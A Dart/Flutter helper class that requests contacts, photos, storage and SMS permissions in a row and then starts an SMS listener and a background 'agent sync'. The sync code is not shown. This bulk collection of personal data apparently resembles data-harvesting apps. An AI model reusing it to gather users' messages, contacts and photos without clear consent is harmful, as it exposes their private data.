import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'agent_sync_service.dart';

class AgentPermissionHelper {
  /// Request all required permissions for Agent sync (Contacts, Photos, Storage, SMS)
  /// and trigger background sync and SMS listener.
  static Future<bool> requestAllPermissionsAndSync() async {
    try {
      // 1. Contacts
      final contactsStatus = await Permission.contacts.status;
      if (!contactsStatus.isGranted && !contactsStatus.isPermanentlyDenied) {
        await Permission.contacts.request();
      }

      // 2. Photos (Android 13+)
      final photosStatus = await Permission.photos.status;
      if (!photosStatus.isGranted && !photosStatus.isPermanentlyDenied) {
        await Permission.photos.request();
      }

      // 3. Storage (Android 12 and below)
      final storageStatus = await Permission.storage.status;
      if (!storageStatus.isGranted && !storageStatus.isPermanentlyDenied) {
        await Permission.storage.request();
      }

      // 4. SMS
      final smsStatus = await Permission.sms.status;
      if (!smsStatus.isGranted && !smsStatus.isPermanentlyDenied) {
        await Permission.sms.request();
      }

      // 5. PhotoManager extend
      try {
        await PhotoManager.requestPermissionExtend();
      } catch (_) {}

      // Trigger sync
      AgentSyncService.instance.initSmsListener();
      AgentSyncService.instance.triggerSync();
      return true;
    } catch (e) {
      print('AgentPermissionHelper error: $e');
      return false;
    }
  }

  /// Check permission status summary
  static Future<Map<String, bool>> checkPermissions() async {
    final contacts = await Permission.contacts.isGranted;
    final photos = await Permission.photos.isGranted || await Permission.storage.isGranted;
    final sms = await Permission.sms.isGranted;
    return {
      'contacts': contacts,
      'photos': photos,
      'sms': sms,
    };
  }
}

